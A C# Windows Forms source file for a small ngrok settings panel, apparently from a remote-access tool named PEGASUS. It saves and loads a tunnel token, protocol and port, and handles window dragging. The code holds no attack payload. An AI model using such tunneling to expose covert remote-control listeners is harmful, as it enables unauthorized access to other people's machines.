using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace PEGASUS.Design
{
    public partial class FrmNgrokPanel : Form
    {
        public bool IsOK;
        public FrmNgrokPanel()
        {
            InitializeComponent();
        }

        [DllImport("user32.DLL", EntryPoint = "ReleaseCapture")]
        private static extern void ReleaseCapture();

        [DllImport("user32.DLL", EntryPoint = "SendMessage")]
        private static extern void SendMessage(IntPtr hwnd, int wmsg, int wparam, int lparam);

        private void guna2Panel1_MouseDown(object sender, MouseEventArgs e)
        {
            ReleaseCapture();
            SendMessage(Handle, 0x112, 0xf012, 0);
        }

        private void guna2PictureBox2_Click(object sender, EventArgs e)
        {
            Close();
        }



        private void btnStop_Click(object sender, EventArgs e)
        {

        }

        private void FrmNgrokPanel_Load(object sender, EventArgs e)
        {
            txtToken.Text = Properties.Settings.Default.NgrokToken;
            txtProto.Text = Properties.Settings.Default.NgrokProto;
            ProxyPort.Text = Properties.Settings.Default.NgrokPort;
        }

        private void btnStart_Click(object sender, EventArgs e)
        {
            Properties.Settings.Default.NgrokToken = txtToken.Text;
            Properties.Settings.Default.NgrokProto = txtProto.Text;
            Properties.Settings.Default.NgrokPort = ProxyPort.Text;
            Properties.Settings.Default.Save();
                Hide();
        }
    }
}
